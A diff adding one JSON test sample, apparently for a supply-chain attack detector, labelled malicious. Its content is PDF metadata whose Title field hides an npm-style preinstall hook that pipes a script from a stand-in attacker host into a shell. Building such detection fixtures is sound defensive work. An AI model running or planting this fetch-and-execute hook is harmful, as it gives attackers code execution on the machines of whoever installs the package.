@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::102::binary-variations::3",
+  "base_sample_id": "exp::supply-chain-detector::102",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -928294314,
+  "content": "{\n  \"format\": \"pdf\",\n  \"info\": {\n    \"Title\": \"{\\\"scripts\\\": {\\\"preinstall\\\": \\\"curl -s https://evil.example.com/payload.sh | sh\\\"}}\\n\",\n    \"Creator\": \"Microsoft Word\",\n    \"Producer\": \"macOS Quartz PDFContext\",\n    \"CreationDate\": \"D:20260115103000Z\"\n  }\n}",
+  "content_hash": "15a8c173a4a3dca8a4de7486a3f572b0d3e6900e07be0fcf8781cfa384f4fdbc",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-metadata",
+  "difficulty": "advanced"
+}
